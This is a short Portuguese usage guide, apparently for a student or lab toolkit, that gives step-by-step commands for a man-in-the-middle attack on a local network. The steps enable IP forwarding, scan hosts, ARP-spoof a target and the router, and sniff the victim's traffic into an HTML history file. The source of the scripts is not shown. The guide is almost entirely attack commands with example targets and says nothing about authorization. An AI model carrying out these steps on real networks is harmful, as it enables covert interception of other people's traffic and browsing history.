## 1. **Habilitar o Encaminhamento de Pacotes**
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

---

## 2. **Executar o Scan de Rede**
```bash
sudo python3 host_scanner.py <rede/máscara> <timeout_ms>
```
**Exemplo:**
```bash
sudo python3 host_scanner.py 192.168.1.0/24 1000
```

---

## 3. **Executar o ARP Spoofing**
```bash
sudo python3 arp_spoof.py <interface> <IP alvo> <IP roteador> <MAC do atacante>
```
**Exemplo:**
```bash
sudo python3 arp_spoof.py eth0 192.168.1.5 192.168.1.1 12:34:56:78:9A:BC
```

---

## 4. **Capturar o Tráfego**
```bash
sudo python3 traffic_sniffer.py <interface> <arquivo_saida.html>
```
**Exemplo:**
```bash
sudo python3 traffic_sniffer.py eth0 historico.html
```

---

## 5. **Desabilitar o Encaminhamento de Pacotes**
```bash
sudo sysctl -w net.ipv4.ip_forward=0
```
